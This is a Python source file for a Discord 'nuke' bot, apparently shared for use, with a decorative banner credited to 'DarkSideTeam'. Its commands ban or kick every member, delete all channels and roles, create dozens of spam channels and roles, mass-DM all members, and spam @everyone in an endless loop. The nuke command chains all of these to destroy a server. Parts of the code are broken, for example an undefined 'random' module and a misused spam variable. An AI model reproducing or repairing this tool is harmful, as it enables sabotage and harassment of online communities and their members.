print("[ > BOT BY: Jonathan < ] \n")
import os
import colorama
from colorama import Fore
import discord
import asyncio
from discord.ext import commands

intents = discord.Intents.default()
intents.members = True

###########SETUP###############
prefix = "!"                                                       
token = "ใส่Tokenบอทคุณ"                                          
spam_messages = "@everynoe"         
massdm = "ISUS"                    
rolenames = "NAHEE"                                                                  
channels = "ใส่ชื่อห้องที่จะสแปม"
###############################

def Clear():
    os.system('cls')


bot = commands.Bot(command_prefix = prefix)
bot.remove_command("help")


os.system('cls' if os.name == 'nt' else 'clear')
@bot.event
async def on_ready():
    Clear()

    print(f'''{Fore.CYAN}
_________________________________________________     

░░░░░██╗░█████╗░███╗░░██╗░█████╗░████████╗██╗░░██╗
░░░░░██║██╔══██╗████╗░██║██╔══██╗╚══██╔══╝██║░░██║
░░░░░██║██║░░██║██╔██╗██║███████║░░░██║░░░███████║
██╗░░██║██║░░██║██║╚████║██╔══██║░░░██║░░░██╔══██║
╚█████╔╝╚█████╔╝██║░╚███║██║░░██║░░░██║░░░██║░░██║
░╚════╝░░╚════╝░╚═╝░░╚══╝╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝

FB:Napat Suwanpra teep
[ > Code by: Jonathan Jackson< ] 
Function
1.nuke
2.spam
3.ban            
4.kick
5.massdm
6.sname
7.roles
8.dchannels
9.schannels
┌───── •✧✧• ─────┐
    DarkSideTeam
└───── •✧✧• ─────┘
_________________________________________________                                                                                     
BOT Is Online prefix = ! ''' + Fore.RESET)


#help commamd
@bot.command()
async def help(ctx):
        await ctx.message.delete()
        embed = discord.Embed(color=000000, timestamp=ctx.message.created_at)
        embed.set_author(name="TERMINAL")
        embed.add_field(name="`NUKE`", value="- destroys the server")
        embed.add_field(name="`SPAM`", value="- spams the server")
        embed.add_field(name="`BAN`", value="- bans all members in the server")
        embed.add_field(name="`KICK`", value="- kicks all members in the server")
        embed.add_field(name="`MASSDM`", value="- dms everyone in the server with the message provided")
        embed.add_field(name="`SNAME`", value="- changes the server name!")
        embed.add_field(name="`ROLES`", value="- deletes all roles in the server, and creates new ones")
        embed.add_field(name="`DCHANNELS`", value="- deletes all channels in the server")
        embed.add_field(name="`SCHANNELS`", value="- spams channels in the server")
        embed.set_image(url="")
        await ctx.send(embed=embed)

#commands  

@bot.command()
async def spam(ctx):
  guild = ctx.message.guild
  await ctx.message.delete()
  await ctx.send("`Bot is now spamming!`") 
  while True:
    for channel in guild.text_channels:
      await channel.send(spam)

#AC
@bot.command(pass_conext=True)
async def ban(ctx):  
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(ctx.message.guild.members):
       try:
           await guild.ban(member)
           print("User" +member.name + "Has Been  Banned")
       except:
           pass
    await ctx.send("``Banned all!``")

@bot.command(pass_conext=True)
async def kick(ctx):  
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(ctx.message.guild.members):
       try:
           await guild.kick(member)
           print("User" +member.name + "Has Been  Kicked")
       except:
           pass
    await ctx.send("`Kicked all!`")


@bot.command(pass_context=True)
async def massdm(ctx):
    guild = ctx.message.guild
    for member in guild.members:
     await asyncio.sleep(0)
     try:
       await member.send(massdm)
       await ctx.send("`Message Has Been Sent`")
     except:
       pass
        

@bot.command(pass_context=True)
async def roles(ctx, amount):
  guild = ctx.message.guild
  for role in guild.roles:
    try:
      await role.delete()
      print(f"Role: {role} has been deleted")
    except:
      pass
      print(f"Role: {role} could not be deleted")
  for i in range(amount):
    try:
      await guild.create_role(name=rolenames)
      print("Role has been created")
    except:
      print("Role could not be created")
  

@bot.command(pass_context=True)
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild

#banning
    print("ENTERING: Banning members")

    for member in list(ctx.message.guild.members):
       try:
           await guild.ban(member)
           print("User" +member.name + "Has Been  Banned")
       except:
           pass
    await ctx.send("`Banned all!`")

#deleting channels
    print("ENTERING: Deleting channels")

    try:
      for channel in ctx.guild.channels:
        await channel.delete()
        print("Channel deleted")
    except:
      pass
      print("Channel could not be deleted")
    
#creating channels

    print("ENTERING: Creating channels")

    try:
      for i in range(50):
        guild = ctx.message.guild
        await guild.create_text_channel(channels)
        print("Channel created")
    except:
      pass
      print("Channel could not be created")
      

        
#deleting roles
    
    print("ENTERING: deleting roles")

    for role in guild.roles:
      try:
        await role.delete()
        print(f"Role: {role} has been deleted")
      except:
        pass
        print(f"Role: {role} could not be deleted")

#creating role

    print("ENTERING: creating roles")

    for i in range(50):
      try:
        await guild.create_role(name=rolenames)
        print("Role has been created")
      except:
        print("Role could not be created")
    print("ENTERING: Spamming messages")

    while True:
      for channel in guild.text_channels:
        await channel.send(spam_messages)


@bot.command()
async def Sname(ctx, msg=None):
 if msg is not None:
    await ctx.guild.edit(name=msg)
 else:
 	await ctx.send('``what do you want me to change the server name to?``')

@bot.command()
async def dchannels(ctx):
  for channel in ctx.guild.channels:
      await channel.delete()

@bot.command(pass_context=True)
async def schannels(ctx):
  await ctx.message.delete()
  await ctx.send("`Creating channels...`")
  guild = ctx.message.guild
  for i in range(50):
    await guild.create_text_channel(random.choice(channels))
    for channel in list(ctx.message.guild.channels):
       pass
      
bot.run(token)
